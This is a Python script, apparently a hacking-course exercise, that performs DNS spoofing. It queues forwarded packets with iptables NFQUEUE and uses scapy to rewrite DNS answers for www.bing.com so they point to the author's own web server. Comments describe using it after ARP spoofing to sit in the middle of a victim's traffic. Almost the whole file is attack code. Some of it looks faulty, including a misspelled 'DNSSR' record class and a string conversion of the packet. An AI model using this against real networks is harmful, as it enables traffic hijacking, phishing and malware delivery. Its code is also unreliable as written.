#commad used is 
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#FORWARD ocurs only when data is coming fro manother computer


#Theory:
#basically what we are dooning here is that we are storing the messages in the queue and then forwarding it to teh atregt
# we become the man in the middle using the arp spoofing program

#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload()) #prints the trapped packet
    if scapy_packet.haslayer(scapy.DNSSR): #DNSSR DNS service response
        qname =scapy_packet[scapy.DNSQR].qname  #these fields can be seen in the scapy_packet.show()
        if "www.bing.com" in qname:
            print("Spoofing target")
            answer= scapy.DNSSR(rrname=qname,rdata='192.168.1.105') # 105 is my web server , we are directing it to my IP address
            scapy_packet[scapy.DNS].an = answer  #setting the modfied data
            #ancount is the number of asnwers been sent
            scapy_packet[scapy.DNS].ancount=1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            #we are deleting these , bcuz we dpnt our packets to get corrupted , sscapy will recalculate them before sending

            packet.set_payload(str(scapy_packet)) #send the packet

        print(scapy_packet.show()) # prints all the layers o fthe packet
    packet.accept() #forward the packet to the target packet.drop to drop packts (net cuter)



queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

# iptables --flush    to delete the new ip tableswe had created

# to practice on our own computer
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#  sudo iptables -I INPUT -j NFQUEUE --queue-num 0


